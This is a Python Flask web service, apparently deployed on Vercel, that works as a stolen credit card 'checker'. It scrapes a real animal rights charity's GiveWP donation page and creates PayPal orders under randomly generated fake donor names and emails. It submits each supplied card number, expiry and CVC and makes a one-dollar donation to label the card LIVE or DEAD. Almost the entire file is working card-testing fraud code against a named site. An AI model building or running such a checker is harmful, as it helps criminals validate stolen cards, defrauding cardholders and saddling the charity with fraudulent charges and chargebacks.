# Dev : @xoxhunterxd
import requests
import re
import random
import string
import base64
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

def random_string(length):
    """Matches randomString function in checker.js line 4."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

@app.route('/check', methods=['GET'])
def check_card():
    # Input format: /check?cc=number|mm|yy|cvc
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({
            "status": "DEAD",
            "msg": "INVALID_FORMAT",
            "dev": "@xoxhunterxd"
        })

    try:
        # Matches argument splitting in checker.js line 39
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
    except Exception:
        return jsonify({"status": "DEAD", "msg": "PARSE_ERROR", "dev": "@xoxhunterxd"})

    # Session manages cookies automatically, replacing cookieJar from checker.js line 2
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
    })

    try:
        # 1. Initial Request (Matches checker.js line 46)
        init_html = session.get('https://animalrights.org.au/donate-now/').text
        form_url = re.search(r"data-form-view-url='([^']+)'", init_html).group(1).replace('&#038;', '&')
        
        # 2. Get Form Exports (Matches checker.js line 49-51)
        form_html = session.get(form_url).text
        exported_match = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_html)
        data = json.loads(exported_match.group(1))

        # 3. Get PayPal Token (Matches checker.js line 53-73)
        gateway = next((g for g in data['registeredGateways'] if g['id'] == 'paypal-commerce'), data['registeredGateways'][0])
        settings = gateway['settings']
        client_id = settings['sdkOptions']['clientId']
        
        auth = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token', 
                                 headers={'Authorization': f'Basic {auth}', 'Accept': 'application/json'},
                                 data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 4. Create Order via AJAX (Matches checker.js line 81-100)
        user_first = random_string(6).capitalize()
        user_last = random_string(6).capitalize()
        user_email = f"{random_string(10)}@{random.choice(['gmail.com', 'outlook.com', 'yahoo.com'])}"
        
        ajax_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': str(settings['donationFormId']),
            'give-form-hash': settings['donationFormNonce'],
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': user_first,
            'give_last': user_last,
            'give_email': user_email,
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
        order_id = order_res['data']['id']

        # 5. Confirm Payment (Matches checker.js line 105-125)
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={
                "payment_source": {
                    "card": {
                        "number": number,
                        "security_code": cvv,
                        "expiry": f"{year_full}-{month}",
                    }
                }
            }
        ).json()

        # 6. Final Response Logic (Matches checker.js line 130-165)
        if confirm_res.get('status') == 'APPROVED':
            # Extract routing parameters for the final signature check
            params = dict(re.findall(r'([^?&]+)=([^&]+)', data['donateUrl']))
            
            final_form = {
                'amount': '1',
                'currency': 'AUD',
                'donationType': 'single',
                'formId': str(settings['donationFormId']),
                'gatewayId': 'paypal-commerce',
                'firstName': user_first,
                'lastName': user_last,
                'email': user_email,
                'anonymous': 'false',
                'isEmbed': 'true',
                'locale': 'en_AU',
                'gatewayData[payPalOrderId]': order_id,
                'originUrl': 'https://animalrights.org.au/donate-now/',
            }
            
            # Real final donation hit to verify card isn't flagged
            final_res = session.post('https://animalrights.org.au/', params={
                'givewp-route': 'donate',
                'givewp-route-signature': params.get('givewp-route-signature'),
                'givewp-route-signature-id': params.get('givewp-route-signature-id'),
                'givewp-route-signature-expiration': params.get('givewp-route-signature-expiration'),
            }, data=final_form)

            return jsonify({
                "status": "LIVE",
                "card": cc_param,
                "msg": "Approved",
                "dev": "@xoxhunterxd",
                "raw_response": final_res.text[:300] # Full raw snippet from the site
            })
        else:
            # Matches decline logic in checker.js line 170
            msg = confirm_res.get('message', 'DECLINED')
            if 'details' in confirm_res:
                msg = confirm_res['details'][0].get('issue', 'DECLINED')
            return jsonify({
                "status": "DEAD",
                "card": cc_param,
                "msg": msg,
                "dev": "@xoxhunterxd"
            })

    except Exception as e:
        return jsonify({
            "status": "DEAD",
            "card": cc_param,
            "msg": "GATEWAY_ERROR",
            "dev": "@xoxhunterxd",
            "error": str(e)
        }), 200

# Vercel entrypoint mapping
application = app
